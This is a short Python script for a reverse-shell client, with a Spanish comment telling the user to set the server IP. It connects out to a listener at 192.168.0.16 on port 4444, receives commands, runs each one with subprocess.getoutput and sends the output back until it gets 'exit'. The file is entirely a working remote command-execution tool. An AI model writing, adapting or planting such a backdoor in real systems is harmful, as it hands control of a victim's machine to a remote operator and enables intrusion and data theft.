import socket
import subprocess

def start_client():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(('192.168.0.16', 4444))  # Cambiar a la IP del servidor
    
    while True:
        command = client_socket.recv(1024).decode()
        if command.lower() == 'exit':
            break
        output = subprocess.getoutput(command)
        client_socket.send(output.encode())

if __name__ == "__main__":
    start_client()
